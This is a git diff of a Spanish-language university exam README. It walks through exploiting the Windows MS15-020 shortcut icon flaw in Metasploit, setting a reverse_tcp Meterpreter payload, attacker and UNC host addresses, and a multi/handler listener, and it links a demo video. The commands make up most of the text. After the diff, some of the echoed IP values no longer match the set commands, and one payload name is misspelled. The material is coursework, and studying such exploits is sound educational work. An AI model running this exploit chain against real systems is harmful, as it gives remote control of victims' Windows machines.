@@ -2,7 +2,7 @@
 Repositorio para Ciberseguridad 2019-I
 Parcial Ciberseguridad 2019-1 
 
-Juan Esteban Monsalve Echeverry - 1036397191 
+Juan Esteban Monsalve Echeverry
 
 Vulnerabilidad 
 
@@ -18,17 +18,20 @@ Software
 Sistema opertativo: Kali Linux 
 Herramienta: 
 Metaexploit 
+
+-----------------------------------------------------------------------------------------------------------
 Instructivo 
+-----------
 
 msf > use exploit/windows/fileformat/ms15_020_shortcut_icon_dllloader 
 
 msf exploit(ms15_020_shortcut_icon_dllloader) > set payload windows/meterpreter/reverse_tcp 
 payload => windows/meterpreter/reverse_tcp 
 
-msf exploit(ms15_020_shortcut_icon_dllloader) > set lhost 192.168.0.11 
+msf exploit(ms15_020_shortcut_icon_dllloader) > set lhost 10.191.5.5
 lhost=> 192.168.0.11 
 
-msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCHOST 192.168.0.10 
+msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCHOST 10.191.5.6
 UNCHOST => 192.168.0.10 
 
 msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCSHARE share 
@@ -41,12 +44,12 @@ use exploit/multi/handler
 
 set payload windows/meterpreter/reverser_tcp 
 
-set lhost 192.168.10.1
+set lhost 10.191.5.6
 
 ----------------------------------------------------------------------------------------------------------
 Video Demo
 
-
+https://youtu.be/oq0XCedmUwI
 
 ----------------------------------------------------------------------------------------------------------
 
